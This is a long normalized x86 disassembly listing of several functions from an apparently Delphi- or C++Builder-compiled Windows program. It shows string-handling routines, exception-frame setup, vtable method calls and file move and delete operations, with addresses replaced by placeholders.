inc [ ebp - 0x98 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x37c ]
call sub_48df68
lea edx [ ebp - 0x3c ]
lea eax [ ebp - 0x8 ]
call sub_4d31b4
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0xa4 ] 0x60
mov edx rw-data
lea eax [ ebp - 0x40 ]
call sub_4d3010
inc [ ebp - 0x98 ]
lea edx [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
call sub_4d324c
push eax
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_4d318c
pop ecx
test cl cl
jne r-xdata
mov [ ebp - 0xa4 ] 0x84
mov edx rw-data
lea eax [ ebp - 0x5c ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x98 ]
inc [ ebp - 0x98 ]
lea eax [ ebp - 0x5c ]
push eax
lea edx [ ebp - 0x8 ]
lea eax [ ebp - 0x54 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x98 ]
inc [ ebp - 0x98 ]
lea edx [ ebp - 0x54 ]
xor eax eax
mov [ ebp - 0x58 ] eax
inc [ ebp - 0x98 ]
lea ecx [ ebp - 0x58 ]
inc [ ebp - 0x98 ]
mov eax [ rw-data ]
add eax 0x4
call sub_402e08
lea eax [ ebp - 0x58 ]
xor edx edx
mov [ ebp - 0x60 ] edx
inc [ ebp - 0x98 ]
lea ecx [ ebp - 0x60 ]
inc [ ebp - 0x98 ]
pop edx
call sub_402e08
mov eax [ ebp - 0x60 ]
test eax eax
jne r-xdata
inc ebx
push 0x10
mov edx rw-data
mov [ ebp - 0xa4 ] 0x78
lea eax [ ebp - 0x4c ]
call sub_4d3128
inc [ ebp - 0x98 ]
xor eax eax
mov [ ebp - 0x50 ] eax
lea eax [ ebp - 0x8 ]
inc [ ebp - 0x98 ]
lea edx [ ebp - 0x4c ]
lea ecx [ ebp - 0x50 ]
call sub_4d31c8
mov edx [ ebp - 0x50 ]
test edx edx
je r-xdata
lea eax [ ebp - 0x48 ]
call sub_4d3128
inc [ ebp - 0x98 ]
lea edx [ ebp - 0x48 ]
lea eax [ ebp - 0x8 ]
call sub_4d3288
test eax eax
lea eax [ ebp - 0x48 ]
sete cl
and ecx 0x1
mov edx 0x2
push ecx
dec [ ebp - 0x98 ]
call sub_4d318c
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x44 ]
mov edx 0x2
call sub_4d318c
pop ecx
test cl cl
je r-xdata
mov edi [ ebp - 0x60 ]
test edi edi
je r-xdata
mov ecx rw-data
jmp r-xdata
mov edx rw-data
mov edx [ ebp - 0x50 ]
jmp r-xdata
mov ecx [ ebp - 0x60 ]
movzx eax [ edi - 0xa ]
cmp eax 0x2
jne r-xdata
push ecx
mov edx rw-data
lea eax [ ebp - 0x6c ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x98 ]
inc [ ebp - 0x98 ]
lea edx [ ebp - 0x6c ]
push edx
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x64 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x98 ]
inc [ ebp - 0x98 ]
lea edx [ ebp - 0x64 ]
xor eax eax
mov [ ebp - 0x68 ] eax
inc [ ebp - 0x98 ]
lea ecx [ ebp - 0x68 ]
inc [ ebp - 0x98 ]
mov eax [ rw-data ]
add eax 0x4
call sub_402e08
lea eax [ ebp - 0x68 ]
xor edx edx
mov [ ebp - 0x70 ] edx
inc [ ebp - 0x98 ]
lea ecx [ ebp - 0x70 ]
inc [ ebp - 0x98 ]
pop edx
call sub_402e08
mov eax [ ebp - 0x70 ]
test eax eax
jne r-xdata
mov ecx rw-data
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4826f8
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x50 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x4c ]
mov edx 0x2
call sub_4d318c
or ebx 0xffffffff
jmp r-xdata
mov ebx [ ebp - 0x70 ]
test ebx ebx
je r-xdata
mov ecx rw-data
jmp r-xdata
lea eax [ ebp - 0x60 ]
call j_sub_44a5d8#2
lea edx [ ebp - 0x60 ]
lea eax [ ebp - 0x60 ]
call sub_41e5d8
mov ecx [ ebp - 0x70 ]
movzx eax [ ebx - 0xa ]
cmp eax 0x2
jne r-xdata
push ecx
call MoveFileA
test eax eax
sete dl
and edx 0x1
push edx
dec [ ebp - 0x98 ]
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x70 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x98 ]
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x6c ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x98 ]
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x68 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x98 ]
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x64 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x98 ]
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x60 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x98 ]
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x5c ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x98 ]
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x58 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x98 ]
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x54 ]
xor edx edx
call sub_4d2728
pop ecx
test cl cl
je r-xdata
mov eax [ esi ]
mov edx [ ebp + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov eax [ esi ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor ebx ebx
jmp r-xdata
push 0x10
mov edx rw-data
mov [ ebp - 0xa4 ] 0x90
lea eax [ ebp - 0x74 ]
call sub_4d3128
inc [ ebp - 0x98 ]
xor eax eax
mov [ ebp - 0x78 ] eax
lea eax [ ebp - 0x8 ]
inc [ ebp - 0x98 ]
lea edx [ ebp - 0x74 ]
lea ecx [ ebp - 0x78 ]
call sub_4d31c8
mov edx [ ebp - 0x78 ]
test edx edx
je r-xdata
lea eax [ ebp - 0x70 ]
call j_sub_44a5d8#2
lea edx [ ebp - 0x70 ]
lea eax [ ebp - 0x70 ]
call sub_41e5d8
mov eax [ esi ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jl r-xdata
mov edx rw-data
mov edx [ ebp - 0x78 ]
jmp r-xdata
mov [ ebp - 0xa4 ] 0x9c
xor eax eax
mov [ ebp - 0x7c ] eax
lea ecx [ ebp - 0x7c ]
inc [ ebp - 0x98 ]
mov eax [ esi ]
mov edx ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x7c ]
test eax eax
je r-xdata
lea ebx [ esi + 0x10 ]
lea eax [ ebp - 0x4 ]
push eax
push ebx
call sub_412480
add esp 0x8
mov [ ebp - 0xbc ] eax
mov edx [ ebp - 0xbc ]
mov [ ebp - 0xf8 ] edx
mov ecx [ ebx + 0x28 ]
mov [ ebp - 0xc0 ] ecx
mov eax [ ebp - 0xc0 ]
mov [ ebp - 0x108 ] eax
mov edx [ ebp - 0x108 ]
mov ecx [ ebp - 0xf8 ]
cmp edx ecx
sete al
and eax 0x1
test al al
jne r-xdata
mov ecx rw-data
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4826f8
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x78 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_4d318c
jmp r-xdata
mov edx rw-data
mov edx [ ebp - 0x7c ]
jmp r-xdata
mov ecx [ ebx + 0x28 ]
lea edi [ ebp - 0x120 ]
mov [ ebp - 0xcc ] ecx
mov eax [ ebp - 0xcc ]
mov [ ebp - 0x118 ] eax
jmp r-xdata
mov edx [ ebp - 0xf8 ]
mov [ ebp - 0xc4 ] edx
mov ecx [ ebp - 0xc4 ]
add ecx 0xc
mov [ ebp - 0xc8 ] ecx
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc8 ]
call sub_4d327c
test al al
je r-xdata
inc ebx
mov [ esi + 0x4 ] ebx
jmp r-xdata
lea eax [ ebp - 0x80 ]
call sub_4d3128
inc [ ebp - 0x98 ]
lea edx [ ebp - 0x80 ]
lea eax [ ebp - 0x8 ]
call sub_4d3288
test eax eax
lea eax [ ebp - 0x80 ]
sete cl
and ecx 0x1
mov edx 0x2
push ecx
dec [ ebp - 0x98 ]
call sub_4d318c
dec [ ebp - 0x98 ]
lea eax [ ebp - 0x7c ]
mov edx 0x2
call sub_4d318c
pop ecx
test cl cl
je r-xdata
mov eax [ edi ]
add esp 0xfffffff0
mov [ ebp - 0xf0 ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0xec ] eax
mov edx [ edi + 0x8 ]
mov [ ebp - 0xe8 ] edx
lea edx [ esi + 0x10 ]
mov [ ebp - 0xa4 ] 0x18
mov ecx [ ebp - 0xf0 ]
mov [ esp ] ecx
mov ecx [ ebp - 0xec ]
mov [ esp + 0x4 ] ecx
lea ecx [ ebp - 0x130 ]
mov eax [ ebp - 0xe8 ]
mov [ esp + 0x8 ] eax
push edx
push ecx
call sub_406ce8
add esp 0x18
lea ebx [ esi + 0x10 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
call sub_412480
add esp 0x8
mov edi eax
mov [ ebp - 0x138 ] edi
mov edx [ ebx + 0x28 ]
mov [ ebp - 0xd0 ] edx
mov ecx [ ebp - 0xd0 ]
mov [ ebp - 0x148 ] ecx
mov eax [ ebp - 0x148 ]
mov edx [ ebp - 0x138 ]
cmp eax edx
sete cl
and ecx 0x1
test cl cl
jne r-xdata
lea edi [ ebp - 0x100 ]
mov [ ebp - 0xa4 ] 0xb4
xor ecx ecx
mov [ ebp - 0xdc ] ecx
lea edx [ ebp - 0x8 ]
lea eax [ ebp - 0x88 ]
call sub_4d3050
inc [ ebp - 0x98 ]
lea eax [ ebp - 0x88 ]
mov ecx [ ebp - 0xdc ]
mov [ ebp - 0x84 ] ecx
inc [ ebp - 0x98 ]
push eax
add esp 0xfffffff0
mov edx [ ebp - 0x140 ]
lea eax [ ebp - 0x160 ]
mov [ esp ] edx
mov edx [ ebp - 0x13c ]
mov [ esp + 0x4 ] edx
mov ecx [ ebp - 0x138 ]
mov [ esp + 0x8 ] ecx
push ebx
push eax
call sub_4124cc
add esp 0x1c
lea edi [ ebp - 0x140 ]
mov ecx 0x4
lea eax [ ebp - 0x88 ]
push esi
lea esi [ ebp - 0x160 ]
[ edi ] [ esi ]
pop esi
mov edx 0x2
dec [ ebp - 0x98 ]
dec [ ebp - 0x98 ]
call sub_4d318c
mov [ ebp - 0xa4 ] 0xa8
mov eax [ ebp - 0x138 ]
mov [ ebp - 0xd4 ] eax
mov edx [ ebp - 0xd4 ]
add edx 0xc
mov [ ebp - 0xd8 ] edx
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0xd8 ]
call sub_4d327c
test al al
je r-xdata
mov ecx [ ebp - 0x138 ]
add ecx 0x10
mov eax [ esi + 0x8 ]
mov [ ecx ] eax
jmp r-xdata
sub_414ea0
push ebp
mov ebp esp
add esp 0xffffffa4
mov eax rw-data
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
call sub_4c517c
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jg r-xdata
push 0x4
xor ecx ecx
mov [ ebp - 0x4c ] 0xc
mov [ ebp - 0x4 ] ecx
lea ecx [ ebp - 0x4 ]
inc [ ebp - 0x40 ]
mov eax [ ebx ]
mov edx [ ebp + 0xc ]
mov esi [ eax ]
call [ esi + 0xc ]
lea edx [ ebp - 0x4 ]
xor eax eax
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x8 ]
inc [ ebp - 0x40 ]
mov eax rw-data
call sub_4d3564
lea edx [ ebp - 0x8 ]
push edx
mov edx rw-data
lea eax [ ebp - 0xc ]
call sub_4d3010
inc [ ebp - 0x40 ]
xor eax eax
mov [ ebp - 0x10 ] eax
lea edx [ ebp - 0xc ]
inc [ ebp - 0x40 ]
lea ecx [ ebp - 0x10 ]
pop eax
call sub_4d31c8
mov edx [ ebp - 0x10 ]
test edx edx
je r-xdata
mov eax [ rw-data ]
push 0x10
mov ecx rw-data
mov edx rw-data
mov eax [ eax ]
call sub_4826f8
xor eax eax
mov edx [ ebp - 0x5c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
mov edx rw-data
mov edx [ ebp - 0x10 ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4c ] 0x18
xor ecx ecx
mov [ ebp - 0x14 ] ecx
lea ecx [ ebp - 0x14 ]
inc [ ebp - 0x40 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebp - 0x14 ]
lea eax [ ebp - 0x18 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x40 ]
inc [ ebp - 0x40 ]
lea edx [ ebp - 0x18 ]
xor eax eax
mov [ ebp - 0x1c ] eax
inc [ ebp - 0x40 ]
lea ecx [ ebp - 0x1c ]
inc [ ebp - 0x40 ]
mov eax [ rw-data ]
add eax 0x4
call sub_402e08
lea edx [ ebp - 0x1c ]
lea eax [ ebp - 0x20 ]
push edx
mov edx rw-data
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x40 ]
inc [ ebp - 0x40 ]
xor eax eax
mov [ ebp - 0x24 ] eax
lea edx [ ebp - 0x20 ]
inc [ ebp - 0x40 ]
inc [ ebp - 0x40 ]
lea ecx [ ebp - 0x24 ]
pop eax
call sub_402e08
mov edx [ ebp - 0x24 ]
test edx edx
jne r-xdata
xor eax eax
mov edx [ ebp - 0x5c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
mov ecx rw-data
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4826f8
cmp eax 0x7
lea eax [ ebp - 0x10 ]
sete dl
and edx 0x1
push edx
mov edx 0x2
dec [ ebp - 0x40 ]
call sub_4d318c
dec [ ebp - 0x40 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
pop ecx
test cl cl
je r-xdata
mov esi [ ebp - 0x24 ]
test esi esi
je r-xdata
mov ecx rw-data
jmp r-xdata
mov ecx [ ebp - 0x24 ]
movzx eax [ esi - 0xa ]
cmp eax 0x2
jne r-xdata
push ecx
call DeleteFileA
dec [ ebp - 0x40 ]
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x24 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x40 ]
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x20 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x40 ]
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x1c ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x40 ]
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x18 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_4d318c
mov edx [ ebx + 0x4 ]
mov eax [ ebx ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx [ ebx + 0x4 ]
cmp eax ecx
jg r-xdata
mov [ ebp - 0x4c ] 0x24
xor edx edx
mov [ ebp - 0x28 ] edx
lea ecx [ ebp - 0x28 ]
inc [ ebp - 0x40 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx ]
mov esi [ eax ]
call [ esi + 0xc ]
lea edx [ ebp - 0x28 ]
lea eax [ ebp - 0x2c ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x40 ]
inc [ ebp - 0x40 ]
lea edx [ ebp - 0x2c ]
xor eax eax
mov [ ebp - 0x30 ] eax
inc [ ebp - 0x40 ]
lea ecx [ ebp - 0x30 ]
inc [ ebp - 0x40 ]
mov eax [ rw-data ]
add eax 0x4
call sub_402e08
lea edx [ ebp - 0x30 ]
lea eax [ ebp - 0x34 ]
push edx
mov edx rw-data
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x40 ]
inc [ ebp - 0x40 ]
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x34 ]
inc [ ebp - 0x40 ]
inc [ ebp - 0x40 ]
lea ecx [ ebp - 0x38 ]
pop eax
call sub_402e08
lea edx [ ebp - 0x38 ]
mov ecx [ edx ]
push ecx
mov eax [ ebx + 0x8 ]
push eax
call sub_40fc08
add esp 0x8
dec [ ebp - 0x40 ]
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x38 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x40 ]
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x34 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x40 ]
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x30 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x40 ]
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x2c ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebx + 0x4 ]
mov [ ebx + 0x40 ] ecx
call sub_40e96c
mov al 0x1
mov edx [ ebp - 0x5c ]
mov [ fs : 0x0 ] edx
mov eax [ ebp + 0xc ]
dec eax
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x24 ]
call j_sub_44a5d8#2
lea edx [ ebp - 0x24 ]
lea eax [ ebp - 0x24 ]
call sub_41e5d8
sub_4151ec
push ebp
mov ebp esp
add esp 0xffffffb4
mov eax rw-data
push ebx
push esi
mov ebx [ ebp + 0x8 ]
call sub_4c517c
mov [ ebp - 0x3c ] 0xc
xor edx edx
mov [ ebp - 0x4 ] edx
lea ecx [ ebp - 0x4 ]
inc [ ebp - 0x30 ]
mov edx [ ebp + 0xc ]
mov eax [ ebx ]
mov esi [ eax ]
call [ esi + 0xc ]
lea edx [ ebp - 0x4 ]
xor eax eax
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x8 ]
inc [ ebp - 0x30 ]
mov eax rw-data
call sub_4d3564
lea edx [ ebp - 0x8 ]
push edx
mov edx rw-data
lea eax [ ebp - 0xc ]
call sub_4d3010
inc [ ebp - 0x30 ]
xor eax eax
mov [ ebp - 0x10 ] eax
lea edx [ ebp - 0xc ]
inc [ ebp - 0x30 ]
lea ecx [ ebp - 0x10 ]
pop eax
call sub_4d31c8
lea edx [ ebp - 0x10 ]
lea eax [ ebp - 0x14 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x30 ]
lea edx [ ebp - 0x14 ]
inc [ ebp - 0x30 ]
mov eax [ edx ]
push eax
push rw-data
push 0x18d
push rw-data
push rw-data
call sub_41c26c
add esp 0x14
dec [ ebp - 0x30 ]
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x14 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x30 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x3c ] 0x18
xor ecx ecx
mov [ ebp - 0x18 ] ecx
lea ecx [ ebp - 0x18 ]
inc [ ebp - 0x30 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx ]
mov esi [ eax ]
call [ esi + 0xc ]
lea edx [ ebp - 0x18 ]
lea eax [ ebp - 0x1c ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x30 ]
inc [ ebp - 0x30 ]
lea edx [ ebp - 0x1c ]
xor eax eax
mov [ ebp - 0x20 ] eax
inc [ ebp - 0x30 ]
lea ecx [ ebp - 0x20 ]
inc [ ebp - 0x30 ]
mov eax [ rw-data ]
add eax 0x4
call sub_402e08
lea edx [ ebp - 0x20 ]
lea eax [ ebp - 0x24 ]
push edx
mov edx rw-data
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x30 ]
inc [ ebp - 0x30 ]
xor eax eax
mov [ ebp - 0x28 ] eax
lea edx [ ebp - 0x24 ]
inc [ ebp - 0x30 ]
inc [ ebp - 0x30 ]
lea ecx [ ebp - 0x28 ]
pop eax
call sub_402e08
lea edx [ ebp - 0x28 ]
mov ecx [ edx ]
push ecx
mov eax [ ebx + 0x8 ]
push eax
call sub_410ee8
add esp 0x8
dec [ ebp - 0x30 ]
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x28 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x30 ]
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x24 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x30 ]
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x20 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x30 ]
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x1c ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4d318c
mov al 0x1
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4153d4
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x28 ] 0x18
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4d3010
inc [ ebp - 0x1c ]
xor ecx ecx
mov [ ebp - 0x28 ] 0xc
mov [ ebp - 0x28 ] 0x24
mov [ ebp - 0x8 ] ecx
lea edx [ ebp - 0x8 ]
inc [ ebp - 0x1c ]
lea eax [ ebp - 0x4 ]
call sub_4d33a0
lea ecx [ ebp - 0x8 ]
push ecx
mov edx rw-data
lea eax [ ebp - 0xc ]
call sub_4d3010
inc [ ebp - 0x1c ]
lea edx [ ebp - 0xc ]
pop eax
call sub_4d3394
test eax eax
lea eax [ ebp - 0xc ]
setg cl
and ecx 0x1
mov edx 0x2
push ecx
dec [ ebp - 0x1c ]
call sub_4d318c
dec [ ebp - 0x1c ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
pop ecx
test cl cl
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
dec [ ebp - 0x1c ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebp - 0x38 ]
mov [ fs : 0x0 ] ecx
jmp r-xdata
xor ecx ecx
mov edx [ ebp - 0x4 ]
mov ecx [ edx - 0x4 ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x28 ] 0x30
lea eax [ ebp - 0x10 ]
mov edx [ ebp + 0x10 ]
call sub_4d3010
inc [ ebp - 0x1c ]
mov ecx [ eax ]
push ecx
mov eax [ ebp - 0x4 ]
push eax
mov edx [ rw-data ]
push edx
call sub_41b4c4
add esp 0xc
mov esi eax
dec [ ebp - 0x1c ]
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x28 ] 0xc
test esi esi
jl r-xdata
dec [ ebp - 0x1c ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov eax [ ebp - 0x38 ]
mov [ fs : 0x0 ] eax
jmp r-xdata
test ecx ecx
jne r-xdata
mov ecx [ rw-data ]
mov eax [ ecx ]
sub eax 0x1
jb r-xdata
mov eax esi
mov ecx [ rw-data ]
shl eax 0x2
mov [ ebp - 0x28 ] 0x48
mov edx [ ecx + 0x18 ]
lea eax [ eax + eax * 2 ]
add edx eax
lea eax [ ebp - 0x14 ]
add edx 0x4
call sub_4d3050
inc [ ebp - 0x1c ]
mov [ ebp - 0x28 ] 0x3c
mov edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov esi eax
test esi esi
jl r-xdata
dec [ ebp - 0x1c ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebp - 0x38 ]
mov [ fs : 0x0 ] ecx
je r-xdata
dec [ ebp - 0x1c ]
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x28 ] 0xc
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov ecx [ ebx + 0x40 ]
cmp edx ecx
je r-xdata
dec eax
je r-xdata
mov edx [ ebp + 0x10 ]
push edx
push edi
push rw-data
push rw-data
call sub_41c354
add esp 0x10
push 0x1
push esi
push ebx
call sub_412c58
add esp 0xc
mov eax [ ebp + 0x10 ]
push eax
push edi
push rw-data
push rw-data
call sub_41c354
add esp 0x10
push 0x0
mov edx [ ebx + 0x40 ]
push edx
push ebx
call sub_412c58
add esp 0xc
jmp r-xdata
mov ecx [ ebp + 0x10 ]
push ecx
push edi
push rw-data
push rw-data
call sub_41c354
add esp 0x10
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
push edx
push ebx
call sub_4132d0
add esp 0x8
jmp r-xdata
sub_415638
push ebp
mov ebp esp
add esp 0xfffffe08
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0xc ]
mov eax rw-data
call sub_4c517c
lea edx [ esi + 0x20 ]
push edx
call sub_4168b4
pop ecx
dec eax
mov ecx [ esi + 0x2c ]
cmp eax ecx
ja r-xdata
push 0x0
mov edx [ ebp + 0x18 ]
push edx
mov ecx [ esi + 0x28 ]
push ecx
push ebx
mov eax [ esi + 0x28 ]
push eax
push esi
call sub_416e08
add esp 0x18
mov [ ebp - 0x1f4 ] eax
inc [ esi + 0x2c ]
mov edx [ esi + 0x28 ]
cmp ebx edx
jne r-xdata
lea eax [ ebp - 0x7c ]
lea edx [ ebp - 0x84 ]
push eax
push 0x0
push 0x0
push 0x0
push 0x1
push r-xdata
push 0x0
mov [ ebp - 0x6c ] 0x18
push edx
call sub_408628
pop ecx
lea ecx [ ebp - 0x84 ]
push ecx
lea eax [ ebp - 0x50 ]
push eax
call sub_408650
add esp 0x8
mov edx 0xf
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x85 ] 0x0
mov ecx [ ebp - 0x34 ]
cmp ecx 0x10
jb r-xdata
mov cl [ ebp + 0x10 ]
test cl cl
je r-xdata
mov ecx [ esi + 0x28 ]
mov eax [ ebp - 0x1f4 ]
mov [ ecx + 0x4 ] eax
mov edx [ esi + 0x28 ]
mov ecx [ ebp - 0x1f4 ]
mov [ edx ] ecx
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x1f4 ]
mov [ eax + 0x8 ] edx
jmp r-xdata
lea eax [ ebp - 0x48 ]
mov eax [ ebp - 0x48 ]
jmp r-xdata
mov ecx [ ebp - 0x1f4 ]
mov [ ebx + 0x8 ] ecx
mov eax [ esi + 0x28 ]
mov edx [ eax + 0x8 ]
cmp ebx edx
jne r-xdata
mov eax [ ebp - 0x1f4 ]
mov [ ebx ] eax
mov edx [ esi + 0x28 ]
mov ecx [ edx ]
cmp ebx ecx
jne r-xdata
mov eax [ ebp - 0x1f4 ]
jmp r-xdata
xor edx edx
jmp r-xdata
mov edx rw-data
mov ecx [ ebp - 0x34 ]
cmp ecx 0x10
jb r-xdata
xor edx edx
mov [ ebp - 0x38 ] edx
add eax edx
mov [ ebp - 0x8c ] eax
mov eax [ ebp - 0x8c ]
mov cl [ ebp - 0x85 ]
mov [ eax ] cl
push rw-data
call sub_4c4e7c
pop ecx
mov edi eax
mov eax rw-data
test eax eax
je r-xdata
mov ecx [ esi + 0x28 ]
mov eax [ ebp - 0x1f4 ]
mov [ ecx + 0x8 ] eax
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x1f4 ]
mov [ eax ] edx
jmp r-xdata
mov edx [ eax + 0x4 ]
mov cl [ edx + 0x14 ]
test cl cl
je r-xdata
test dl dl
je r-xdata
lea eax [ ebp - 0x48 ]
mov eax [ ebp - 0x48 ]
jmp r-xdata
mov ecx [ edx + 0x4 ]
mov ecx [ ecx ]
cmp edx ecx
jne r-xdata
mov eax [ esi + 0x28 ]
mov edx [ eax + 0x4 ]
mov [ edx + 0x14 ] 0x1
mov eax [ ebp - 0x1f4 ]
mov [ ebp - 0x1f8 ] eax
mov edx [ ebp + 0x8 ]
mov ecx [ ebp - 0x1f8 ]
mov [ edx + 0x8 ] ecx
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x7c ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x50 ]
push edx
call sub_408880
pop ecx
mov [ ebp - 0x11c ] eax
mov ecx [ ebp - 0x11c ]
cmp ecx 0x1
ja r-xdata
mov eax rw-data
mov ecx [ ebp - 0x34 ]
cmp ecx 0x10
jb r-xdata
mov edx [ ebp - 0x34 ]
cmp edx 0x10
jb r-xdata
cmp edx eax
jb r-xdata
mov edx [ eax + 0x4 ]
